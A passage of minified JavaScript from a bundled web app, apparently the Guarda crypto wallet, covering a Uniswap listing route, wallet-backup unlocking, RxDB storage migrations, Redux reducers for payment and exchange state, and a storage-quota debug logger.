            className: "col-xs-12"
        }, O.createElement("div", {
            className: fie
        }, O.createElement(j.rs, null, O.createElement(j.AW, {
            exact: !0,
            path: "/app/uniswap-listing",
            component: OptionsTokenListingPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/uniswap-listing/confirm",
            component: ConfirmationPage
        }), O.createElement(j.AW, {
            exact: !0,
            path: "/app/uniswap-listing/success",
            component: SuccessPage
        }), O.createElement(j.AW, {
            component: _404
        }))))));
        function UniswapListing() {
            const e = useLocationSearch()
              , t = (0,
            $.I0)()
              , a = (0,
            $.v9)(oe.Oj)
              , n = (0,
            $.v9)(oe.Yq)
              , r = (0,
            $.v9)(oe.Oj)
              , l = (0,
            $.v9)($c)
              , [s,i] = (0,
            O.useState)(e.title);
            (0,
            O.useEffect)(( () => {
                async function start() {
                    try {
                        if (r) {
                            const e = await t(restoreStorage());
                            await t(restoreWallets(e ? e.wallets : []))
                        }
                    } catch (e) {}
                }
                start()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                a && n ? l.length || restore() : i(!0);
                async function restore() {
                    const e = await t(restoreStorage());
                    await t(restoreWallets(e ? e.wallets : []))
                }
            }
            ), []);
            const handleUnlockBackup = async e => {
                const a = await t(restoreStorage(e));
                await t(restoreWallets(a ? a.wallets : []));
                await t(ie.setMasterPassword({
                    masterPassword: e
                }));
                i(!1)
            }
            ;
            return O.createElement("div", {
                className: pie
            }, O.createElement(ale, {
                visible: Boolean(s),
                onClose: () => i(!1),
                onSuccessPassword: handleUnlockBackup
            }), O.createElement(uniswap_listing_components_header, null), O.createElement(uniswap_listing_router, null), O.createElement(Footer_Footer, null))
        }
        var hie = a(90178)
          , gie = a(83104)
          , yie = a(38643)
          , vie = a(68981);
        function skipEqualCalls(e, t) {
            let a, n = Promise.resolve();
            return function(r) {
                if (t(r, a))
                    return n;
                a = r;
                n = e.call(this, r);
                return n
            }
        }
        function skipIntermediateCalls(e) {
            const t = {}
              , a = new wu.default({
                concurrency: 1
            });
            let n = [];
            return async function(r) {
                const l = await a.add((async () => {
                    if (0 !== a.size)
                        return Promise.resolve(t);
                    try {
                        await e.call(this, r);
                        for (const e of n)
                            e.resolve()
                    } catch (e) {
                        for (const t of n)
                            t.reject(e);
                        throw e
                    } finally {
                        n = []
                    }
                }
                ));
                if (l === t)
                    return new Promise(( (e, t) => {
                        n.push({
                            resolve: e,
                            reject: t
                        })
                    }
                    ))
            }
        }
        const memoizeSubstorageCollectionMethods = e => {
            let {persistName: t, persistLens: a, persistRead: n, persistWrite: r, persistRemove: l} = e;
            return {
                persistName: t,
                persistLens: a,
                persistRead: n,
                persistWrite: skipEqualCalls(skipIntermediateCalls(r), $.wU),
                persistRemove: l
            }
        }
          , bindSubstorageCollectionMethods = (e, t) => {
            let {persistName: a, persistLens: n, persistRead: r, persistWrite: l, persistRemove: s} = t;
            return {
                persistName: a,
                persistLens: n,
                persistRead: r.bind(e),
                persistWrite: l.bind(e),
                persistRemove: s.bind(e)
            }
        }
        ;
        var _ie = a(67894)
          , wie = a(68841)
          , bie = a(94851);
        const kie = ee.P.create({
            name: "bulk-migrate"
        });
        function noopMigration(e) {
            return e
        }
        function composeMigrations(e, t) {
            return e === noopMigration && t === noopMigration ? noopMigration : async a => t(await e(a))
        }
        const Sie = {};
        async function bulkMigrateDocuments(e, t, a) {
            if (e === noopMigration)
                return {
                    hadErrors: !1,
                    newDocuments: a
                };
            let n, r;
            const l = await Promise.all(a.map((async a => {
                let l;
                try {
                    l = await e(a)
                } catch (e) {
                    kie.error(e);
                    void 0 === n && (n = e);
                    return Sie
                }
                try {
                    t.validate(l)
                } catch (e) {
                    kie.error(e);
                    void 0 === r && (r = e);
                    return Sie
                }
                return l
            }
            )));
            let s = 0;
            const i = l.filter((e => {
                const t = e === Sie;
                t && (s += 1);
                return !t
            }
            ))
              , o = s > 0;
            if (o) {
                var c;
                ge.b.error(ge.d.FAILED_PERSIST_BULK_MIGRATION_WRITE_SKIPPED, null !== (c = n) && void 0 !== c ? c : r)
            }
            return {
                newDocuments: i,
                hadErrors: o
            }
        }
        const Cie = 2 ** 30;
        async function bulkMigrateFromTo(e, t, a) {
            let n = noopMigration;
            const r = t.schema.version
              , l = a.schema.version;
            for (let t = r + 1; t <= l; t++) {
                const a = undefined;
                n = composeMigrations(n, e.migrationStrategies[t])
            }
            const s = await (0,
            bie.rE)(t, Cie)
              , {hadErrors: i, newDocuments: o} = await bulkMigrateDocuments(n, a.schema, s);
            await a.bulkInsert(o);
            i ? kie.warn("Keeping old collection due to errors") : await (0,
            bie.GG)(t)
        }
        async function bulkMigrateOneCollection(e) {
            const t = e.getDataMigrator()
              , a = await (0,
            bie.HY)(t);
            for (const e of a)
                await bulkMigrateFromTo(t, e, t.newestCollection)
        }
        async function bulkMigrate(e, t) {
            await Promise.all(Object.entries(e).map((async e => {
                var a;
                let[n,r] = e;
                const l = undefined;
                if (null !== (a = t[n].extendedOptions) && void 0 !== a && a.bulkMigrate && await r.migrationNeeded()) {
                    kie.log("migrations for", n, "pending");
                    await bulkMigrateOneCollection(r);
                    kie.log("migrations for", n, "resolved")
                }
            }
            )))
        }
        const Nie = {
            createSubstorage(e) {
                let {key: t, persistLens: a} = e;
                return memoizeSubstorageCollectionMethods({
                    persistName: () => `key-value/${t}`,
                    persistLens: a,
                    persistRead: async () => {
                        const e = await this.findOne(t).exec();
                        if (!e)
                            return;
                        const {value: a} = e;
                        return JSON.parse(a)
                    }
                    ,
                    persistWrite: async e => {
                        await this.atomicUpsert({
                            key: t,
                            value: JSON.stringify(e)
                        })
                    }
                    ,
                    persistRemove: async () => {
                        await this.findOne(t).remove()
                    }
                })
            }
        }
          , Tie = undefined
          , Aie = {
            schema: wie.Z,
            statics: Nie,
            migrationStrategies: {
                1: function migrateRateRecords(e) {
                    if (e.key !== _ie.storeKey)
                        return e;
                    const t = JSON.parse(e.value)
                      , a = {
                        rates: (0,
                        vie.Z)((e => (0,
                        vie.Z)((e => [e]), e)), t.rates)
                    }
                      , n = undefined;
                    return {
                        key: e.key,
                        value: JSON.stringify(a)
                    }
                },
                2: noopMigration,
                3: noopMigration,
                4: noopMigration,
                5: noopMigration,
                6: noopMigration,
                7: noopMigration,
                8: noopMigration,
                9: noopMigration,
                10: noopMigration
            },
            extendedOptions: {
                bulkMigrate: !0
            }
        };
        var xie = a(16308)
          , Iie = a(51056)
          , Pie = a(84234);
        function staticSchemaTypecheck(e) {
            return e
        }
        const Lie = 512;
        function requestIdle() {
            let {timeout: e=Lie} = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return new Promise((t => {
                window.requestIdleCallback(( () => t()), {
                    timeout: e
                })
            }
            ))
        }
        const Fie = 128;
        async function bulkRemoveInIdleBatches(e) {
            let {collection: t, removeIds: a, idleBatchSize: n=Fie, idleTimeout: r} = e;
            const l = (0,
            Q0.Z)(n, a);
            for (const e of l) {
                await requestIdle({
                    timeout: r
                });
                await t.bulkRemove(e)
            }
        }
        async function bulkInsertInIdleBatches(e) {
            let {collection: t, insertDocuments: a, idleBatchSize: n=Fie, idleTimeout: r} = e;
            const l = (0,
            Q0.Z)(n, a);
            for (const e of l) {
                await requestIdle({
                    timeout: r
                });
                await t.bulkInsert(e)
            }
        }
        const warnUnexpectedTransactionValue = (e, t) => {
            console.warn("Unexpected value of for key", t, "in transaction", e, "was deleted.\n", "Please fix the adapter.")
        }
          , Wie = {
            toSubstorage() {
                return bindSubstorageCollectionMethods(this, this)
            },
            ...memoizeSubstorageCollectionMethods({
                persistName: () => "trasnsactions",
                persistLens: (0,
                Iie.Z)([ou, "txs"]),
                async persistRead() {
                    const [e,t] = await Promise.all([(0,
                    gie.Lo)(this.pouch), await this.find().exec()])
                      , a = undefined;
                    if (!(0 === e))
                        return t.map((e => e.toJSON()))
                },
                async persistWrite(e) {
                    for (const t of e) {
                        if (Number.isNaN(t.confirmations) || null === t.confirmations) {
                            warnUnexpectedTransactionValue(t, "confirmations");
                            delete t.confirmations
                        }
                        if (void 0 !== t.blockhash && "string" != typeof t.blockhash) {
                            warnUnexpectedTransactionValue(t, "blockhash");
                            delete t.blockhash
                        }
                        if (void 0 !== t.isIncoming && "boolean" != typeof t.isIncoming) {
                            warnUnexpectedTransactionValue(t, "isIncoming");
                            delete t.isIncoming
                        }
                        if (null === t.fee) {
                            warnUnexpectedTransactionValue(t, "fee");
                            delete t.fee
                        }
                        if ("transactinId"in t) {
                            warnUnexpectedTransactionValue(t, "transactinId");
                            delete t.transactinId
                        }
                        if ("__key"in t) {
                            const e = t;
                            e.primaryKey = e.__key;
                            delete e.__key
                        }
                        for (const e of Object.keys(t))
                            if (!(e in Pie.Z.properties)) {
                                console.warn("Unexpected key", e, "in transaction", t, "was deleted.\n", "Please fix the adapter update the transaction schema.\n");
                                delete t[e]
                            }
                    }
                    const t = e.filter((e => {
                        try {
                            this.schema.validate(e)
                        } catch (e) {
                            if ("RxError (VD2)" === e.name) {
                                ge.b.error(ge.d.FAILED_PERSIST_VALIDATE_WRITE_SKIPPED, e);
                                return !1
                            }
                            throw e
                        }
                        return !0
                    }
                    ))
                      , a = t.map((e => e.primaryKey))
                      , n = new Set(a);
                    await requestIdle();
                    const r = await this.find().exec();
                    await requestIdle();
                    const l = undefined
                      , s = r.map((e => e.primaryKey)).filter((e => !n.has(e)));
                    await Promise.all([bulkRemoveInIdleBatches({
                        collection: this,
                        removeIds: s
                    }), bulkInsertInIdleBatches({
                        collection: this,
                        insertDocuments: t
                    })])
                },
                async persistRemove() {
                    const e = await this.find().exec();
                    await this.bulkRemove(e.map((e => e._id)))
                }
            })
        }
          , Rie = undefined
          , Bie = {
            schema: Pie.Z,
            statics: Wie,
            migrationStrategies: {
                1: noopMigration,
                2: noopMigration,
                3: noopMigration,
                4: noopMigration,
                5: noopMigration,
                6: noopMigration,
                7: noopMigration,
                8: noopMigration,
                9: noopMigration,
                10: noopMigration,
                11: noopMigration,
                12: noopMigration,
                13: noopMigration,
                14: noopMigration,
                15: noopMigration,
                16: noopMigration,
                17: noopMigration,
                18: noopMigration,
                19: noopMigration
            },
            extendedOptions: {
                bulkMigrate: !0
            }
        }
          , Oie = Object.fromEntries(Object.entries({
            key_value: Aie,
            transactions: Bie
        }).map((e => {
            var t;
            let[a,n] = e
              , r = n;
            null !== (t = r.extendedOptions) && void 0 !== t && t.bulkMigrate && (r = {
                ...r,
                autoMigrate: !1
            });
            return [a, r]
        }
        )));
        (0,
        gie.oo)(yie.Z);
        const Die = "guarda_app_redux_persist_db"
          , Mie = "idb"
          , Uie = Boolean(M.CM && "1" === (0,
        bu.ZP)("remove-rxdb"))
          , Gie = {
            auto_compaction: !0,
            revs_limit: 1
        }
          , createDatabase = async e => {
            let {key: t} = e;
            const a = [Die, t.replaceAll(":", "_")].join("_");
            Uie && await (0,
            gie.B2)(a, Mie);
            const n = await (0,
            gie.tl)({
                name: a,
                adapter: Mie,
                pouchSettings: Gie
            });
            M.CM && Object.assign(window, {
                database: n
            });
            const r = await n.addCollections(Oie);
            await bulkMigrate(r, Oie);
            return n
        }
        ;
        var Vie = a(795), Kie = a(85538), Hie = a(94631), zie = a(93245), jie, $ie, Zie, Yie;
        const qie = "payment"
          , Xie = [""]
          , Qie = {
            side: "#sell" === (null === (jie = window) || void 0 === jie || null === ($ie = jie.location) || void 0 === $ie ? void 0 : $ie.hash) ? "sell" : "buy",
            fiatWallet: "#sell" === (null === (Zie = window) || void 0 === Zie || null === (Yie = Zie.location) || void 0 === Yie ? void 0 : Yie.hash) ? "eur" : "usd",
            fiatAmount: String(x4),
            cryptoAmount: "0",
            isAmountError: !1,
            paymentCreateTransaction: {},
            optimalPurchase: "0",
            isFiatSupported: !0,
            fiatList: [],
            coinList: [],
            tokenList: {},
            partners: [],
            partnersIsLoading: !1,
            partnersIsError: !1,
            limits: {
                limits: {
                    min: null,
                    max: null
                },
                amountValidateObject: {
                    precision: 2,
                    min: null,
                    max: null,
                    isFullErrorMessage: !0
                }
            },
            limitsIsLoading: !1,
            estimateIsLoading: !1,
            wallets: [],
            walletsHash: "",
            currenciesIsLoading: !1,
            partner: "guardarian",
            maxEstimate: null,
            estimates: {
                simplex: {
                    partner: "simplex"
                },
                guardarian: {
                    partner: "guardarian"
                }
            },
            isLoadingGetCurrencies: !1
        }
          , fetchPartnersIsLoading = (e, t) => ({
            ...e,
            partnersIsLoading: t.payload
        })
          , fetchPartnersIsError = (e, t) => ({
            ...e,
            partnersIsError: t.payload
        })
          , fetchPartnersCommit = (e, t) => ({
            ...e,
            ...t.payload
        })
          , fetchLimitsIsLoading = (e, t) => ({
            ...e,
            limitsIsLoading: t.payload
        })
          , fetchLimitsCommit = (e, t) => ({
            ...e,
            limits: t.payload
        })
          , fetchEstimateIsLoading = (e, t) => ({
            ...e,
            estimateIsLoading: t.payload
        })
          , changePartner = (e, t) => ({
            ...e,
            partner: t.payload
        })
          , changeSide = (e, t) => ({
            ...e,
            side: t.payload
        })
          , changeCryptoAmount = (e, t) => ({
            ...e,
            cryptoAmount: t.payload
        })
          , changeFiatAmount = (e, t) => ({
            ...e,
            fiatAmount: t.payload
        })
          , fetchEstimateCommit = (e, t) => ({
            ...e,
            ...t.payload
        })
          , setIsFiatSupported = (e, t) => ({
            ...e,
            isFiatSupported: t.payload
        })
          , changeFiatWalletCommit = (e, t) => ({
            ...e,
            fiatWallet: t.payload
        })
          , setOptimalPurchase = (e, t) => ({
            ...e,
            optimalPurchase: t.payload
        })
          , setLimitsCommit = (e, t) => ({
            ...e,
            limits: t.payload.limits
        })
          , errorCheckCommit = (e, t) => ({
            ...e,
            isAmountError: t.payload
        })
          , setAmountPaymentCreateTransaction = (e, t) => ({
            ...e,
            paymentCreateTransaction: {
                ...e.paymentCreateTransaction,
                amount: t.payload
            }
        })
          , setPaymentCreateTransaction = (e, t) => ({
            ...e,
            paymentCreateTransaction: t.payload
        })
          , setIsLoadingGetCurrencies = (e, t) => ({
            ...e,
            isLoadingGetCurrencies: t.payload
        })
          , getCurrenciesCommit = (e, t) => ({
            ...e,
            ...t.payload
        })
          , Jie = {
            [(0,
            te.getType)(_O.fetchPartnersIsError)]: fetchPartnersIsError,
            [(0,
            te.getType)(_O.fetchPartnersIsLoading)]: fetchPartnersIsLoading,
            [(0,
            te.getType)(_O.fetchPartnersCommit)]: fetchPartnersCommit,
            [(0,
            te.getType)(_O.fetchLimitsIsLoading)]: fetchLimitsIsLoading,
            [(0,
            te.getType)(_O.fetchLimitsCommit)]: fetchLimitsCommit,
            [(0,
            te.getType)(_O.fetchEstimateIsLoading)]: fetchEstimateIsLoading,
            [(0,
            te.getType)(_O.fetchEstimateCommit)]: fetchEstimateCommit,
            [(0,
            te.getType)(_O.changePartner)]: changePartner,
            [(0,
            te.getType)(_O.changeSide)]: changeSide,
            [(0,
            te.getType)(_O.changeCryptoAmount)]: changeCryptoAmount,
            [(0,
            te.getType)(_O.changeFiatAmount)]: changeFiatAmount,
            [(0,
            te.getType)(_O.setIsFiatSupported)]: setIsFiatSupported,
            [(0,
            te.getType)(_O.changeFiatWalletCommit)]: changeFiatWalletCommit,
            [(0,
            te.getType)(_O.setOptimalPurchase)]: setOptimalPurchase,
            [(0,
            te.getType)(_O.setLimitsCommit)]: setLimitsCommit,
            [(0,
            te.getType)(_O.errorCheckCommit)]: errorCheckCommit,
            [(0,
            te.getType)(_O.setAmountPaymentCreateTransaction)]: setAmountPaymentCreateTransaction,
            [(0,
            te.getType)(_O.setPaymentCreateTransaction)]: setPaymentCreateTransaction,
            [(0,
            te.getType)(_O.setIsLoadingGetCurrencies)]: setIsLoadingGetCurrencies,
            [(0,
            te.getType)(_O.getCurrenciesCommit)]: getCurrenciesCommit
        }
          , eoe = (0,
        Ru.Z)(Jie, Qie);
        var toe = a(40661)
          , aoe = a(42225);
        const noe = "@fio/addresses"
          , roe = ["pendingAccounts"]
          , loe = {
            pendingAccounts: {},
            fioAddressesData: {},
            accounts: []
        }
          , soe = (0,
        te.createReducer)(loe).handleAction(Co, ( (e, t) => {
            let {payload: {fioAddressesData: a}} = t;
            return {
                ...e,
                fioAddressesData: a
            }
        }
        )).handleAction(ko, ( (e, t) => {
            let {payload: {pendingAccounts: a}} = t;
            return {
                ...e,
                pendingAccounts: a
            }
        }
        )).handleAction(So, ( (e, t) => {
            let {payload: {accounts: a}} = t;
            return {
                ...e,
                accounts: a
            }
        }
        )).handleAction(No, (e => ({
            ...e,
            pendingAccounts: {},
            fioAddressesData: {},
            accounts: []
        }))).handleAction(ne, (e => ({
            ...e,
            pendingAccounts: {},
            fioAddressesData: {},
            accounts: []
        })))
          , ioe = {
            cloWithdrawsInProgress: {}
        }
          , ooe = "clo-withdraws"
          , coe = ["cloWithdrawsInProgress"]
          , uoe = "@clo-withdraw/ADD_NEW_CLO_WITHDRAW"
          , doe = "@clo-withdraw/REMOVE_CLO_WITHDRAW"
          , moe = (0,
        Ru.Z)({
            [uoe]: (e, t) => {
                let {id: a, time: n} = t;
                return {
                    ...e,
                    cloWithdrawsInProgress: {
                        ...e.cloWithdrawsInProgress,
                        [a]: n
                    }
                }
            }
            ,
            [doe]: (e, t) => {
                let {id: a} = t;
                return {
                    ...e,
                    cloWithdrawsInProgress: Object.keys(e.cloWithdrawsInProgress).reduce(( (t, n) => {
                        n !== a && (t[n] = e.cloWithdrawsInProgress[n]);
                        return t
                    }
                    ), {})
                }
            }
        }, ioe)
          , selectedCloWithdraw = e => e[ooe].cloWithdrawsInProgress
          , addNewCloWithdraw = (e, t) => a => {
            a({
                type: uoe,
                id: e,
                time: t
            })
        }
          , removeCloWithdraw = e => t => {
            t({
                type: doe,
                id: e
            })
        }
          , poe = {
            hiddenVersion: void 0,
            bannerInfo: {
                version: void 0,
                bannerTitle: void 0,
                bannerContent: void 0,
                bannerSVG: void 0
            },
            fetchError: void 0
        }
          , setClearStore = () => ({
            ...poe
        })
          , setBannerInfo = (e, t) => ({
            ...e,
            bannerInfo: t.payload.bannerInfo
        })
          , setHiddenBannerId = (e, t) => ({
            ...e,
            hiddenVersion: t.payload.version
        })
          , setFetchError = (e, t) => ({
            ...e,
            fetchError: t.payload.error
        })
          , foe = (0,
        gw.Lq)(poe, {
            [(0,
            te.getType)(y$.setClearStore)]: setClearStore,
            [(0,
            te.getType)(y$.setBannerInfo)]: setBannerInfo,
            [(0,
            te.getType)(y$.setHiddenBannerVersion)]: setHiddenBannerId,
            [(0,
            te.getType)(y$.setFetchError)]: setFetchError
        })
          , Eoe = {
            name: m$,
            storeKey: m$,
            whitelist: ["hiddenVersion"],
            reducer: foe
        }
          , hoe = {
            currencies: [],
            lastCurrenciesFetched: null,
            partner: null,
            captchaCode: "",
            tokens: [],
            isFailedFetchEstimate: !1,
            exchangeTransaction: null,
            exchangeError: "",
            orderInfo: null,
            orderError: "",
            isApplyableForDustRequest: !0,
            dustInvoiceId: "",
            mainPageStep: U4.WAIT_FOR_EXCHANGE,
            walletTo: null,
            walletFrom: null,
            isFetchingExchangeUpdateTx: !1,
            exchangeStatusHistory: [],
            sendAssetsResponse: null,
            exchangeAssetsList: [],
            exchangeInfo: {
                estimate: null,
                limits: {},
                isLoading: !0,
                isSupportedPair: !0,
                isError: !1,
                quotaId: void 0
            },
            totalGethBalance: void 0,
            amount: ""
        }
          , exchange_reducer_setClearStore = e => ({
            ...hoe,
            currencies: e.currencies,
            tokens: e.tokens,
            sendAssetsResponse: e.sendAssetsResponse,
            walletTo: e.walletTo,
            walletFrom: e.walletFrom,
            amount: e.amount
        })
          , setExchangeCurrencies = (e, t) => ({
            ...e,
            currencies: t.payload.currencies
        })
          , setExchangePartner = (e, t) => ({
            ...e,
            partner: t.payload
        })
          , setExchangeCaptcha = (e, t) => ({
            ...e,
            captchaCode: t.payload
        })
          , setAllTokens = (e, t) => ({
            ...e,
            tokens: t.payload.tokens
        })
          , setIsFailedFetchEstimate = (e, t) => ({
            ...e,
            isFailedFetchEstimate: t.payload
        })
          , setExchangeTransaction = (e, t) => ({
            ...e,
            exchangeTransaction: t.payload
        })
          , setOrderInfo = (e, t) => ({
            ...e,
            orderInfo: t.payload
        })
          , setOrderError = (e, t) => ({
            ...e,
            orderError: t.payload
        })
          , setExchangeError = (e, t) => ({
            ...e,
            exchangeError: t.payload
        })
          , setIsApplyableForDustRequest = (e, t) => ({
            ...e,
            isApplyableForDustRequest: t.payload
        })
          , setDustInvoiceId = (e, t) => ({
            ...e,
            dustInvoiceId: t.payload
        })
          , setMainPageStep = (e, t) => ({
            ...e,
            mainPageStep: t.payload
        })
          , setWalletTo = (e, t) => ({
            ...e,
            walletTo: t.payload
        })
          , setWalletFrom = (e, t) => ({
            ...e,
            walletFrom: t.payload
        })
          , addExchangeStatusToHistory = (e, t) => ({
            ...e,
            exchangeStatusHistory: [...e.exchangeStatusHistory, t.payload]
        })
          , resetExchangeStatusToHistory = e => ({
            ...e,
            exchangeStatusHistory: []
        })
          , setIsFetchingExchangeUpdateTx = (e, t) => ({
            ...e,
            isFetchingExchangeUpdateTx: t.payload
        })
          , setSendAssetsResponse = (e, t) => ({
            ...e,
            sendAssetsResponse: t.payload
        })
          , setExchangeAssetsList = (e, t) => ({
            ...e,
            exchangeAssetsList: t.payload
        })
          , setExchangeInfo = (e, t) => ({
            ...e,
            exchangeInfo: t.payload
        })
          , setTotalGethBalance = (e, t) => ({
            ...e,
            totalGethBalance: t.payload.totalGethBalance
        })
          , setAmount = (e, t) => ({
            ...e,
            amount: t.payload
        })
          , setLastCurrenciesFetched = (e, t) => ({
            ...e,
            lastCurrenciesFetched: t.payload
        })
          , goe = {
            [(0,
            te.getType)(Fu.setExchangeCurrencies)]: setExchangeCurrencies,
            [(0,
            te.getType)(Fu.setExchangePartner)]: setExchangePartner,
            [(0,
            te.getType)(Fu.setExchangeCaptcha)]: setExchangeCaptcha,
            [(0,
            te.getType)(Fu.setAllTokens)]: setAllTokens,
            [(0,
            te.getType)(Fu.setFailedFetchEstimate)]: setIsFailedFetchEstimate,
            [(0,
            te.getType)(Fu.setOrderInfo)]: setOrderInfo,
            [(0,
            te.getType)(Fu.setOrderError)]: setOrderError,
            [(0,
            te.getType)(Fu.setExchangeTransaction)]: setExchangeTransaction,
            [(0,
            te.getType)(Fu.setExchangeError)]: setExchangeError,
            [(0,
            te.getType)(Fu.setIsApplyableForDustRequest)]: setIsApplyableForDustRequest,
            [(0,
            te.getType)(Fu.setDusterInvoice)]: setDustInvoiceId,
            [(0,
            te.getType)(Fu.setMainPageStep)]: setMainPageStep,
            [(0,
            te.getType)(Fu.setWalletFrom)]: setWalletFrom,
            [(0,
            te.getType)(Fu.setWalletTo)]: setWalletTo,
            [(0,
            te.getType)(Fu.addExchangeStatusToHistory)]: addExchangeStatusToHistory,
            [(0,
            te.getType)(Fu.resetExchangeStatusToHistory)]: resetExchangeStatusToHistory,
            [(0,
            te.getType)(Fu.setIsFetchingExchangeUpdateTx)]: setIsFetchingExchangeUpdateTx,
            [(0,
            te.getType)(Fu.setSendAssetsResponse)]: setSendAssetsResponse,
            [(0,
            te.getType)(Fu.setExchangeAssetsList)]: setExchangeAssetsList,
            [(0,
            te.getType)(Fu.setClearExchangeStore)]: exchange_reducer_setClearStore,
            [(0,
            te.getType)(Fu.setExchangeInfo)]: setExchangeInfo,
            [(0,
            te.getType)(Fu.setTotalGethBalance)]: setTotalGethBalance,
            [(0,
            te.getType)(Fu.setAmount)]: setAmount,
            [(0,
            te.getType)(Fu.setLastCurrenciesFetched)]: setLastCurrenciesFetched
        }
          , yoe = {
            name: Ns,
            storeKey: Ns,
            whitelist: ["exchangeStatusHistory", "tokens", "currencies", "sendAssetsResponse", "lastCurrenciesFetched"],
            reducer: (0,
            Ru.Z)(goe, hoe)
        };
        var voe = a(37730);
        const lensPick = e => (0,
        voe.Z)((function() {
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return (0,
            hie.Z)(e, t)
        }
        ), (function() {
            let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}
              , a = arguments.length > 1 ? arguments[1] : void 0;
            return {
                ...a,
                ...(0,
                hie.Z)(e, t)
            }
        }
        ))
          , reducerToKeyValueSubstorage = (e, t) => {
            let {storeKey: a, keyValueWhitelist: n, whitelist: r} = t;
            const l = null != n ? n : r
              , s = (0,
            Hie.Z)(a)
              , i = lensPick(l)
              , o = (0,
            zie.Z)(s, i);
            return e.createSubstorage({
                key: a,
                persistLens: o
            })
        }
          , _oe = [i, s, Sd, r, f, n, _ie, o, p, h, Eoe, yoe, l, v, m, y, c, d, aoe, toe, E, _, w, g, Ac.Zz]
          , getSubstorages = e => [e.transactions.toSubstorage(), ..._oe.map((t => reducerToKeyValueSubstorage(e.key_value, t)))];
        function debug_logger_defineProperty(e, t, a) {
            (t = debug_logger_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function debug_logger_toPropertyKey(e) {
            var t = debug_logger_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function debug_logger_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        const woe = ee.P.create({
            name: "storage-debug-logger"
        });
        class DatabaseStorageDebugLogger {
            constructor() {
                debug_logger_defineProperty(this, "_lock", !1);
                debug_logger_defineProperty(this, "_lastDatabaseStorageOperationTime", 0);
                debug_logger_defineProperty(this, "_lastBackendLogIntervalUpdateTime", 0);
                debug_logger_defineProperty(this, "_lastBackendLogTime", 0);
                debug_logger_defineProperty(this, "_databaseStorageOperationInterval", 1e3);
                debug_logger_defineProperty(this, "_backendLogIntervalUpdateInterval", 1e4);
                debug_logger_defineProperty(this, "_backendLogInterval", 36e5)
            }
            get _nextDatabaseStorageOperationTime() {
                return this._lastDatabaseStorageOperationTime + this._databaseStorageOperationInterval
            }
            get _nextBackendLogIntervalUpdateTime() {
                return this._lastBackendLogIntervalUpdateTime + this._backendLogIntervalUpdateInterval
            }
            get _nextBackendLogTime() {
                return this._lastBackendLogTime + this._backendLogInterval
            }
            async _getQuotaFillFactor() {
                var e, t;
                let a;
                try {
                    var n;
                    a = await (null === (n = navigator.storage) || void 0 === n ? void 0 : n.estimate())
                } catch (e) {
                    console.error(e)
                }
                if (void 0 !== (null === (e = a) || void 0 === e ? void 0 : e.usage) && void 0 !== (null === (t = a) || void 0 === t ? void 0 : t.quota))
                    return a.usage / a.quota
            }
            async _getBackendLogInterval() {
                const e = await this._getQuotaFillFactor();
                woe.log("quota fill factor:", e);
                return e ? e > .95 ? 6e4 : e > .9 ? 3e5 : e > .75 ? 9e5 : e > .5 ? 18e5 : 36e5 : 36e5
            }
            async _sendBackendLog() {
                ge.b.success(ge.d.DEBUG_PERSIST_STORAGE_ESTIMATE)
            }
            async _handleDatabaseStorageOperation() {
                if (Date.now() > this._nextBackendLogIntervalUpdateTime)
                    try {
                        this._backendLogInterval = await this._getBackendLogInterval();
                        woe.log("backend log interval:", this._backendLogInterval)
                    } finally {
                        this._lastBackendLogIntervalUpdateTime = Date.now();
                        woe.log("last backend log interval update time:", this._lastBackendLogIntervalUpdateTime)
                    }
                if (Date.now() > this._nextBackendLogTime)
                    try {
                        await this._sendBackendLog()
                    } finally {
                        this._lastBackendLogTime = Date.now();
                        woe.log("last backend log time:", this._lastBackendLogTime)
                    }
            }
            async onDatabaseStorageOperation() {
                if (this._lock)
                    return;
                const e = Date.now();
                if (e > this._nextDatabaseStorageOperationTime) {
                    this._lock = !0;
                    try {
                        await this._handleDatabaseStorageOperation()
                    } finally {
                        this._lock = !1;
                        this._lastDatabaseStorageOperationTime = e;
                        woe.log("last storage operation:", this._lastDatabaseStorageOperationTime)
                    }
                }
            }
        }
        function database_defineProperty(e, t, a) {
            (t = database_toPropertyKey(t))in e ? Object.defineProperty(e, t, {
                value: a,
                enumerable: !0,
                configurable: !0,
                writable: !0
            }) : e[t] = a;
            return e
        }
        function database_toPropertyKey(e) {
            var t = database_toPrimitive(e, "string");
            return "symbol" == typeof t ? t : String(t)
        }
        function database_toPrimitive(e, t) {
            if ("object" != typeof e || null === e)
                return e;
            var a = e[Symbol.toPrimitive];
            if (void 0 !== a) {
                var n = a.call(e, t || "default");
                if ("object" != typeof n)
                    return n;
                throw new TypeError("@@toPrimitive must return a primitive value.")
            }
            return ("string" === t ? String : Number)(e)
        }
        class DatabaseStorage {
            constructor() {
                database_defineProperty(this, "_debugLogger", new DatabaseStorageDebugLogger);
                database_defineProperty(this, "_substoragesPromise", void 0)
            }
            _lazySubstorages(e) {
                this._substoragesPromise || (this._substoragesPromise = (async () => {
                    this._debugLogger.onDatabaseStorageOperation();
                    try {
                        const t = await createDatabase({
                            key: e
                        })
                          , a = undefined;
                        return {
                            database: t,
                            substorages: getSubstorages(t)
                        }
                    } catch (t) {
                        ge.b.error(ge.d.FAILED_PERSIST_CREATE_DATABASE, t, {
                            key: e
                        });
                        throw t
                    }
                }
                )());
                return this._substoragesPromise
            }
            async destroy() {
                if (this._substoragesPromise) {
                    const {database: e} = await this._substoragesPromise;
                    await e.destroy()
                }
            }
            async getItem(e) {
                this._debugLogger.onDatabaseStorageOperation();
                const {substorages: t} = await this._lazySubstorages(e)
                  , a = await Promise.all(t.map((async t => {
                    let a;
                    try {
                        a = await t.persistRead()
                    } catch (t) {
                        ge.b.error(ge.d.FAILED_PERSIST_READ, t, {
                            key: e
                        });
                        throw t
                    }
                    return {
                        persistLens: t.persistLens,
                        value: a
